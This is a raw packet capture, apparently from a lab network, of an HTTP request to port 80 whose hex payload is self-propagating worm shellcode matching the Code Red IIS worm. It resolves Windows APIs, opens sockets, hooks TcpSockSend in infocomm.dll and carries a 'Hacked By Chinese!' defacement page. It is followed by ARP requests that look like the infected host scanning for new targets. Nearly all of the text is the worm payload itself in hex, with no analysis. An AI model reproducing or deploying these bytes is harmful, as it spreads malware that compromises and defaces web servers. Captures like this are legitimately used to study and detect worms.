	0x0290:  9b0a 0000 83bd 70fe ffff 000f 85dd 0100  ......p.........
	0x02a0:  008b 8d58 feff ff81 c100 0001 0089 8d58  ...X...........X
	0x02b0:  feff ff81 bd58 feff ff00 0000 7875 0ac7  .....X......xu..
	0x02c0:  8558 feff ff00 00f0 bf8b 9558 feff ff33  .X.........X...3
	0x02d0:  c066 8b02 3d4d 5a00 000f 859a 0100 008b  .f..=MZ.........
	0x02e0:  8d58 feff ff8b 513c 8b85 58fe ffff 33c9  .X....Q<..X...3.
	0x02f0:  668b 0c10 81f9 5045 0000 0f85 7901 0000  f.....PE....y...
	0x0300:  8b95 58fe ffff 8b42 3c8b 8d58 feff ff8b  ..X....B<..X....
	0x0310:  5401 7803 9558 feff ff89 9554 feff ff8b  T.x..X.....T....
	0x0320:  8554 feff ff8b 480c 038d 58fe ffff 898d  .T....H...X.....
	0x0330:  4cfe ffff 8b95 4cfe ffff 813a 4b45 524e  L.....L....:KERN
	0x0340:  0f85 3301 0000 8b85 4cfe ffff 8178 0445  ..3.....L....x.E
	0x0350:  4c33 320f 8520 0100 008b 8d58 feff ff89  L32.. .....X....
	0x0360:  8d34 feff ff8b 9554 feff ff8b 8558 feff  .4.....T.....X..
	0x0370:  ff03 4220 8985 4cfe ffff c785 48fe ffff  ..B ..L.....H...
	0x0380:  0000 0000 eb1e 8b8d 48fe ffff 83c1 0189  ........H.......
	0x0390:  8d48 feff ff8b 954c feff ff83 c204 8995  .H.....L........
	0x03a0:  4cfe ffff 8b85 54fe ffff 8b8d 48fe ffff  L.....T.....H...
	0x03b0:  3b48 180f 8dc0 0000 008b 954c feff ff8b  ;H.........L....
	0x03c0:  028b 8d58 feff ff81 3c01 4765 7450 0f85  ...X....<.GetP..
	0x03d0:  a000 0000 8b95 4cfe ffff 8b02 8b8d 58fe  ......L.......X.
	0x03e0:  ffff 817c 0104 726f 6341 0f85 8400 0000  ...|..rocA......
	0x03f0:  8b95 48fe ffff 0395 48fe ffff 0395 58fe  ..H.....H.....X.
	0x0400:  ffff 8b85 54fe ffff 8b48 2433 c066 8b04  ....T....H$3.f..
	0x0410:  0a89 854c feff ff8b 8d54 feff ff8b 5110  ...L.....T....Q.
	0x0420:  8b85 4cfe ffff 8d4c 10ff 898d 4cfe ffff  ..L....L....L...
	0x0430:  8b95 4cfe ffff 0395 4cfe ffff 0395 4cfe  ..L.....L.....L.
	0x0440:  ffff                                     ..
02:46:44.997053 IP (tos 0x0, ttl 64, id 667, offset 0, flags [DF], proto TCP (6), length 1500)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [.], cksum 0x1dc6 (correct), seq 1025:2473, ack 1, win 115, options [nop,nop,TS val 156783 ecr 0], length 1448
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  05dc 029b 4000 4006 1d7f 0a61 0001 0a61  ....@.@....a...a
	0x0020:  0002 e344 0050 6c7a 6af4 033a ac18 8010  ...D.Plzj..:....
	0x0030:  0073 1dc6 0000 0101 080a 0002 646f 0000  .s..........do..
	0x0040:  0000 0395 4cfe ffff 0395 58fe ffff 8b85  ....L.....X.....
	0x0050:  54fe ffff 8b48 1c8b 140a 8995 4cfe ffff  T....H......L...
	0x0060:  8b85 4cfe ffff 0385 58fe ffff 8985 70fe  ..L.....X.....p.
	0x0070:  ffff eb05 e90d ffff ffe9 16fe ffff 8dbd  ................
	0x0080:  f0fe ffff 8b47 0864 a300 0000 0083 bd70  .....G.d.......p
	0x0090:  feff ff00 7505 e938 0800 00c7 854c feff  ....u..8.....L..
	0x00a0:  ff01 0000 00eb 0f8b 8d4c feff ff83 c101  .........L......
	0x00b0:  898d 4cfe ffff 8b95 68fe ffff 0fbe 0285  ..L.....h.......
	0x00c0:  c00f 848d 0000 008b 8d68 feff ff0f be11  .........h......
	0x00d0:  83fa 0975 218b 8568 feff ff83 c001 8bf4  ...u!..h........
	0x00e0:  50ff 9590 feff ff3b f490 434b 434b 8985  P......;..CKCK..
	0x00f0:  34fe ffff eb2a 8bf4 8b8d 68fe ffff 518b  4....*....h...Q.
	0x0100:  9534 feff ff52 ff95 70fe ffff 3bf4 9043  .4...R..p...;..C
	0x0110:  4b43 4b8b 8d4c feff ff89 848d 8cfe ffff  KCK..L..........
	0x0120:  eb0f 8b95 68fe ffff 83c2 0189 9568 feff  ....h........h..
	0x0130:  ff8b 8568 feff ff0f be08 85c9 7402 ebe2  ...h........t...
	0x0140:  8b95 68fe ffff 83c2 0189 9568 feff ffe9  ..h........h....
	0x0150:  53ff ffff 8b85 68fe ffff 83c0 0189 8568  S.....h........h
	0x0160:  feff ff8b 4d08 8b91 8400 0000 8995 6cfe  ....M.........l.
	0x0170:  ffff c785 4cfe ffff 0400 0000 c685 d0fe  ....L...........
	0x0180:  ffff 688b 4508 8985 d1fe ffff c785 d5fe  ..h.E...........
	0x0190:  ffff 5b53 53ff c785 d9fe ffff 6378 9090  ..[SS.......cx..
	0x01a0:  8b4d 088b 5110 8995 50fe ffff 83bd 50fe  .M..Q...P.....P.
	0x01b0:  ffff 0075 268b f46a 008d 854c feff ff50  ...u&..j...L...P
	0x01c0:  8b8d 68fe ffff 518b 5508 8b42 0850 ff95  ..h...Q.U..B.P..
	0x01d0:  6cfe ffff 3bf4 9043 4b43 4b83 bd50 feff  l...;..CKCK..P..
	0x01e0:  ff64 7d5c 8b8d 50fe ffff 83c1 0189 8d50  .d}\..P........P
	0x01f0:  feff ff8b 9550 feff ff69 d28d 66f0 5089  .....P...i..f.P.
	0x0200:  9574 feff ff8b 4508 8b8d 50fe ffff 8948  .t....E...P....H
	0x0210:  108b f48d 952c feff ff52 6a00 8d85 4cfe  .....,...Rj...L.
	0x0220:  ffff 508d 8dd0 feff ff51 6a00 6a00 ff95  ..P......Qj.j...
	0x0230:  98fe ffff 3bf4 9043 4b43 4be9 9f01 0000  ....;..CKCK.....
	0x0240:  8bf4 ff95 a4fe ffff 3bf4 9043 4b43 4b89  ........;..CKCK.
	0x0250:  854c feff ff8b 954c feff ff81 e2ff ff00  .L.....L........
	0x0260:  0089 954c feff ff81 bd4c feff ff09 0400  ...L.....L......
	0x0270:  0074 05e9 6701 0000 8bf4 6800 dd6d 00ff  .t..g.....h..m..
	0x0280:  95a0 feff ff3b f490 434b 434b e980 0600  .....;..CKCK....
	0x0290:  008f 854c feff ff8b 8534 feff ff89 85cc  ...L.....4......
	0x02a0:  feff ff8b 8d4c feff ff8b 95b0 feff ff89  .....L..........
	0x02b0:  118b 854c feff ff8b 8dc8 feff ff89 4804  ...L..........H.
	0x02c0:  8b95 68fe ffff 8995 50fe ffff eb0f 8b85  ..h.....P.......
	0x02d0:  50fe ffff 83c0 0189 8550 feff ff8b 8d68  P........P.....h
	0x02e0:  feff ff81 c100 0100 0039 8d50 feff ff73  .........9.P...s
	0x02f0:  128b 9550 feff ff81 3a4c 4d54 4875 02eb  ...P....:LMTHu..
	0x0300:  02eb cb8b 8550 feff ff83 c004 8b8d 4cfe  .....P........L.
	0x0310:  ffff 8941 088b f48d 9548 feff ff52 6a04  ...A.....H...Rj.
	0x0320:  6800 4000 008b 85cc feff ff50 ff95 a8fe  h.@........P....
	0x0330:  ffff 3bf4 9043 4b43 4bc7 854c feff ff00  ..;..CKCK..L....
	0x0340:  0000 00eb 0f8b 8d4c feff ff83 c101 898d  .......L........
	0x0350:  4cfe ffff 81bd 4cfe ffff 0030 0000 7d56  L.....L....0..}V
	0x0360:  8b95 ccfe ffff 0395 4cfe ffff 8b02 3b85  ........L.....;.
	0x0370:  b0fe ffff 753e 8b8d ccfe ffff 038d 4cfe  ....u>........L.
	0x0380:  ffff 8b95 60fe ffff 8911 8bf4 6800 5125  ....`.......h.Q%
	0x0390:  02ff 95a0 feff ff3b f490 434b 434b 8b85  .......;..CKCK..
	0x03a0:  ccfe ffff 0385 4cfe ffff 8b8d b0fe ffff  ......L.........
	0x03b0:  8908 eb02 eb8f 8bf4 8d95 4cfe ffff 528b  ..........L...R.
	0x03c0:  8548 feff ff50 6800 4000 008b 8dcc feff  .H...Ph.@.......
	0x03d0:  ff51 ff95 a8fe ffff 3bf4 9043 4b43 4bba  .Q......;..CKCK.
	0x03e0:  0100 0000 85d2 0f84 e704 0000 8bf4 6a00  ..............j.
	0x03f0:  6880 0000 006a 036a 006a 0168 0000 0080  h....j.j.j.h....
	0x0400:  8b85 68fe ffff 83c0 6350 ff95 9cfe ffff  ..h.....cP......
	0x0410:  3bf4 9043 4b43 4b89 8530 feff ff83 bd30  ;..CKCK..0.....0
	0x0420:  feff ffff 741f b901 0000 0085 c974 168b  ....t........t..
	0x0430:  f468 ffff ff7f ff95 a0fe ffff 3bf4 9043  .h..........;..C
	0x0440:  4b43 4beb e18b f48d 9538 feff ff52 ff95  KCK......8...R..
	0x0450:  94fe ffff 3bf4 9043 4b43 4b8b 853e feff  ....;..CKCK..>..
	0x0460:  ff89 854c feff ff8b 8d4c feff ff81 e1ff  ...L.....L......
	0x0470:  ff00 0089 8d4c feff ff83 bd4c feff ff14  .....L.....L....
	0x0480:  0f8c 4701 0000 ba01 0000 0085 d20f 843a  ..G............:
	0x0490:  0100 008b f48d 8538 feff ff50 ff95 94fe  .......8...P....
	0x04a0:  ffff 3bf4 9043 4b43 4b8b 8d3e feff ff89  ..;..CKCK..>....
	0x04b0:  8d4c feff ff8b 954c feff ff81 e2ff ff00  .L.....L........
	0x04c0:  0089 954c feff ff83 bd4c feff ff1c 7c1f  ...L.....L....|.
	0x04d0:  b801 0000 0085 c074 168b f468 ffff ff7f  .......t...h....
	0x04e0:  ff95 a0fe ffff 3bf4 9043 4b43 4beb e18b  ......;..CKCK...
	0x04f0:  f46a 64ff 95a0 feff ff3b f490 434b 434b  .jd......;..CKCK
	0x0500:  8bf4 6a00 6a01 6a02 ff95 b8fe ffff 3bf4  ..j.j.j.......;.
	0x0510:  9043 4b43 4b89 8578 feff ff66 c785 7cfe  .CKCK..x...f..|.
	0x0520:  ffff 0200 66c7 857e feff ff00 50c7 8580  ....f..~....P...
	0x0530:  feff ffc6 89f0 5b8b f46a 108d 8d7c feff  ......[..j...|..
	0x0540:  ff51 8b95 78fe ffff 52ff 95bc feff ff3b  .Q..x...R......;
	0x0550:  f490 434b 434b c785 4cfe ffff 0000 0000  ..CKCK..L.......
	0x0560:  eb0f 8b85 4cfe ffff 83c0 0189 854c feff  ....L........L..
	0x0570:  ff81 bd4c feff ff00 8001 007d 378b f468  ...L.......}7..h
	0x0580:  e803 0000 ff95 a0fe ffff 3bf4 9043 4b43  ..........;..CKC
	0x0590:  4b8b f46a 006a 018d 8dfc feff ff51 8b95  K..j.j.......Q..
	0x05a0:  78fe ffff 52ff 95c0 feff ff3b f490 434b  x...R......;..CK
	0x05b0:  434b ebae 8bf4 6800 0000 01ff 95a0 feff  CK....h.........
	0x05c0:  ff3b f490 434b 434b e9b9 feff ff8b 8544  .;..CKCK.......D
	0x05d0:  feff ff89 8550 feff ff8b 8d50 feff ff0f  .....P.....P....
	0x05e0:  af8d 50fe ffff 69c9 e359                 ..P...i..Y
02:46:44.997182 IP (tos 0x0, ttl 64, id 668, offset 0, flags [DF], proto TCP (6), length 1500)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [.], cksum 0x324a (correct), seq 2473:3921, ack 1, win 115, options [nop,nop,TS val 156783 ecr 0], length 1448
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  05dc 029c 4000 4006 1d7e 0a61 0001 0a61  ....@.@..~.a...a
	0x0020:  0002 e344 0050 6c7a 709c 033a ac18 8010  ...D.Plzp..:....
	0x0030:  0073 324a 0000 0101 080a 0002 646f 0000  .s2J........do..
	0x0040:  0000 cd00 8b95 50fe ffff 69d2 b9e1 0100  ......P...i.....
	0x0050:  8b85 74fe ffff 03c1 03d0 8995 50fe ffff  ..t.........P...
	0x0060:  8b8d 74fe ffff 69c9 8333 cf00 81c1 53fe  ..t...i..3....S.
	0x0070:  6b07 898d 74fe ffff 8b95 74fe ffff 81e2  k...t.....t.....
	0x0080:  ff00 0000 8995 50fe ffff 83bd 50fe ffff  ......P.....P...
	0x0090:  7f74 0c81 bd50 feff ffe0 0000 0075 118b  .t...P.......u..
	0x00a0:  8574 feff ff05 a90d 0200 8985 74fe ffff  .t..........t...
	0x00b0:  8bf4 6a64 ff95 a0fe ffff 3bf4 9043 4b43  ..jd......;..CKC
	0x00c0:  4b8b f46a 006a 016a 02ff 95b8 feff ff3b  K..j.j.j.......;
	0x00d0:  f490 434b 434b 8985 78fe ffff 66c7 857c  ..CKCK..x...f..|
	0x00e0:  feff ff02 0066 c785 7efe ffff 0050 8b8d  .....f..~....P..
	0x00f0:  74fe ffff 898d 80fe ffff 8bf4 6a10 8d95  t...........j...
	0x0100:  7cfe ffff 528b 8578 feff ff50 ff95 bcfe  |...R..x...P....
	0x0110:  ffff 3bf4 9043 4b43 4b85 c00f 85ef 0100  ..;..CKCK.......
	0x0120:  008b f46a 006a 048b 8d68 feff ff51 8b95  ...j.j...h...Q..
	0x0130:  78fe ffff 52ff 95c0 feff ff3b f490 434b  x...R......;..CK
	0x0140:  434b c785 4cfe ffff 0000 0000 8b45 088b  CK..L........E..
	0x0150:  4868 898d 64fe ffff eb1e 8b95 64fe ffff  Hh..d.......d...
	0x0160:  83c2 0189 9564 feff ff8b 854c feff ff83  .....d.....L....
	0x0170:  c001 8985 4cfe ffff 8b8d 64fe ffff 0fbe  ....L.....d.....
	0x0180:  1185 d274 02eb d38b f46a 008b 854c feff  ...t.....j...L..
	0x0190:  ff50 8b4d 088b 5168 528b 8578 feff ff50  .P.M..QhR..x...P
	0x01a0:  ff95 c0fe ffff 3bf4 9043 4b43 4b8b f46a  ......;..CKCK..j
	0x01b0:  006a 018b 8d68 feff ff83 c105 518b 9578  .j...h......Q..x
	0x01c0:  feff ff52 ff95 c0fe ffff 3bf4 9043 4b43  ...R......;..CKC
	0x01d0:  4bc7 854c feff ff00 0000 008b 4508 8b48  K..L........E..H
	0x01e0:  6489 8d64 feff ffeb 1e8b 9564 feff ff83  d..d.......d....
	0x01f0:  c201 8995 64fe ffff 8b85 4cfe ffff 83c0  ....d.....L.....
	0x0200:  0189 854c feff ff8b 8d64 feff ff0f be11  ...L.....d......
	0x0210:  85d2 7402 ebd3 8bf4 6a00 8b85 4cfe ffff  ..t.....j...L...
	0x0220:  508b 4d08 8b51 6452 8b85 78fe ffff 50ff  P.M..QdR..x...P.
	0x0230:  95c0 feff ff3b f490 434b 434b c785 4cfe  .....;..CKCK..L.
	0x0240:  ffff 0000 0000 8b8d 68fe ffff 83c1 0789  ........h.......
	0x0250:  8d64 feff ffeb 1e8b 9564 feff ff83 c201  .d.......d......
	0x0260:  8995 64fe ffff 8b85 4cfe ffff 83c0 0189  ..d.....L.......
	0x0270:  854c feff ff8b 8d64 feff ff0f be11 85d2  .L.....d........
	0x0280:  7402 ebd3 8bf4 6a00 8b85 4cfe ffff 508b  t.....j...L...P.
	0x0290:  8d68 feff ff83 c107 518b 9578 feff ff52  .h......Q..x...R
	0x02a0:  ff95 c0fe ffff 3bf4 9043 4b43 4b8b 4508  ......;..CKCK.E.
	0x02b0:  8b48 7089 8d4c feff ff8b f46a 008b 954c  .Hp..L.....j...L
	0x02c0:  feff ff52 8b45 088b 4878 518b 9578 feff  ...R.E..HxQ..x..
	0x02d0:  ff52 ff95 c0fe ffff 3bf4 9043 4b43 4bc6  .R......;..CKCK.
	0x02e0:  85fc feff ff00 8bf4 6a00 6800 0100 008d  ........j.h.....
	0x02f0:  85fc feff ff50 8b8d 78fe ffff 51ff 95c4  .....P..x...Q...
	0x0300:  feff ff3b f490 434b 434b 8985 4cfe ffff  ...;..CKCK..L...
	0x0310:  8bf4 8b95 78fe ffff 52ff 95c8 feff ff3b  ....x...R......;
	0x0320:  f490 434b 434b e90c fbff ffeb fee8 8cf5  ..CKCK..........
	0x0330:  ffff eb30 5883 c005 5557 5356 506a 3c8b  ...0X...UWSVPj<.
	0x0340:  f083 c60c 5668 0001 0000 ff70 08ff 7424  ....Vh.....p..t$
	0x0350:  28ff 1058 50ff 7424 18ff 5004 585e 5b5f  (..XP.t$..P.X^[_
	0x0360:  5dff 2090 e8cb ffff ffe8 7bf9 ffff ebf8  ]. .......{.....
	0x0370:  226e 8432 0375 b3ca 5a04 5634 12b8 7856  "n.2.u..Z.V4..xV
	0x0380:  3412 b878 5634 1258 508b bd68 feff ff89  4..xV4.XP..h....
	0x0390:  47f2 c38b 4424 0c05 b800 0000 c700 daf1  G...D$..........
	0x03a0:  cd00 33c0 c3eb ece8 f1f4 ffff 4c6f 6164  ..3.........Load
	0x03b0:  4c69 6272 6172 7941 0047 6574 5379 7374  LibraryA.GetSyst
	0x03c0:  656d 5469 6d65 0043 7265 6174 6554 6872  emTime.CreateThr
	0x03d0:  6561 6400 4372 6561 7465 4669 6c65 4100  ead.CreateFileA.
	0x03e0:  536c 6565 7000 4765 7453 7973 7465 6d44  Sleep.GetSystemD
	0x03f0:  6566 6175 6c74 4c61 6e67 4944 0056 6972  efaultLangID.Vir
	0x0400:  7475 616c 5072 6f74 6563 7400 0969 6e66  tualProtect..inf
	0x0410:  6f63 6f6d 6d2e 646c 6c00 5463 7053 6f63  ocomm.dll.TcpSoc
	0x0420:  6b53 656e 6400 0957 5332 5f33 322e 646c  kSend..WS2_32.dl
	0x0430:  6c00 736f 636b 6574 0063 6f6e 6e65 6374  l.socket.connect
	0x0440:  0073 656e 6400 7265 6376 0063 6c6f 7365  .send.recv.close
	0x0450:  736f 636b 6574 0009 7733 7376 632e 646c  socket..w3svc.dl
	0x0460:  6c00 0047 4554 2000 3f00 2020 4854 5450  l..GET..?...HTTP
	0x0470:  2f31 2e30 0d0a 436f 6e74 656e 742d 7479  /1.0..Content-ty
	0x0480:  7065 3a20 7465 7874 2f78 6d6c 0a48 4f53  pe:.text/xml.HOS
	0x0490:  543a 7777 772e 776f 726d 2e63 6f6d 0a20  T:www.worm.com..
	0x04a0:  4163 6365 7074 3a20 2a2f 2a0a 436f 6e74  Accept:.*/*.Cont
	0x04b0:  656e 742d 6c65 6e67 7468 3a20 3335 3639  ent-length:.3569
	0x04c0:  200d 0a0d 0a00 633a 5c6e 6f74 776f 726d  ......c:\notworm
	0x04d0:  004c 4d54 480d 0a3c 6874 6d6c 3e3c 6865  .LMTH..<html><he
	0x04e0:  6164 3e3c 6d65 7461 2068 7474 702d 6571  ad><meta.http-eq
	0x04f0:  7569 763d 2243 6f6e 7465 6e74 2d54 7970  uiv="Content-Typ
	0x0500:  6522 2063 6f6e 7465 6e74 3d22 7465 7874  e".content="text
	0x0510:  2f68 746d 6c3b 2063 6861 7273 6574 3d65  /html; charset=e
	0x0520:  6e67 6c69 7368 223e 3c74 6974 6c65 3e48  nglish"><title>H
	0x0530:  454c 4c4f 213c 2f74 6974 6c65 3e3c 2f68  ELLO!</title></h
	0x0540:  6561 643e 3c62 6164 793e 3c68 7220 7369  ead><bady><hr.si
	0x0550:  7a65 3d35 3e3c 666f 6e74 2063 6f6c 6f72  ze=5><font.color
	0x0560:  3d22 7265 6422 3e3c 7020 616c 6967 6e3d  ="red"><p.align=
	0x0570:  2263 656e 7465 7222 3e57 656c 636f 6d65  "center">Welcome
	0x0580:  2074 6f20 6874 7470 3a2f 2f77 7777 2e77  .to.http://www.w
	0x0590:  6f72 6d2e 636f 6d20 213c 6272 3e3c 6272  orm.com.!<br><br
	0x05a0:  3e48 6163 6b65 6420 4279 2043 6869 6e65  >Hacked.By.Chine
	0x05b0:  7365 213c 2f66 6f6e 743e 3c2f 6872 3e3c  se!</font></hr><
	0x05c0:  2f62 6164 793e 3c2f 6874 6d6c 3e20 2020  /bady></html>...
	0x05d0:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x05e0:  2020 2020 2020 2020 2020                 ..........
02:46:44.997183 IP (tos 0x0, ttl 64, id 669, offset 0, flags [DF], proto TCP (6), length 171)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [FP.], cksum 0x8499 (correct), seq 3921:4040, ack 1, win 115, options [nop,nop,TS val 156783 ecr 0], length 119
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  00ab 029d 4000 4006 22ae 0a61 0001 0a61  ....@.@."..a...a
	0x0020:  0002 e344 0050 6c7a 7644 033a ac18 8019  ...D.PlzvD.:....
	0x0030:  0073 8499 0000 0101 080a 0002 646f 0000  .s..........do..
	0x0040:  0000 2020 2020 2020 2020 2020 2020 2020  ................
	0x0050:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x0060:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x0070:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x0080:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x0090:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x00a0:  2020 2020 2020 2020 2020 2020 2020 2020  ................
	0x00b0:  2020 2020 2020 2020 20                   .........
02:46:44.999332 IP (tos 0x0, ttl 128, id 92, offset 0, flags [DF], proto TCP (6), length 52)
    10.97.0.2.80 > 10.97.0.1.58180: Flags [.], cksum 0xc1bc (correct), seq 1, ack 4041, win 17520, options [nop,nop,TS val 1615 ecr 156783], length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0034 005c 4000 8006 e565 0a61 0002 0a61  .4.\@....e.a...a
	0x0020:  0001 0050 e344 033a ac18 6c7a 76bc 8010  ...P.D.:..lzv...
	0x0030:  4470 c1bc 0000 0101 080a 0000 064f 0002  Dp...........O..
	0x0040:  646f                                     do
02:46:45.184344 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.60.195 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 3cc3 0000 0000 0000  .......a<.......
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.229342 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.205.56 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 cd38 0000 0000 0000  .......a.8......
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.274348 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.147.105 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 9369 0000 0000 0000  .......a.i......
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.320349 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.159.6 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 9f06 0000 0000 0000  .......a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.374351 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.94.174 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 5eae 0000 0000 0000  .......a^.......
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.384349 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.150.229 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 96e5 0000 0000 0000  .......a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:45.421351 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.171.163 tell 10.97.0.2, length 46
	0x0000:  ffff ffff ffff 000c 293e 369e 0806 0001  ........)>6.....
	0x0010:  0800 0604 0001 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  0000 0000 0000 0a61 aba3 0000 0000 0000  .......a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
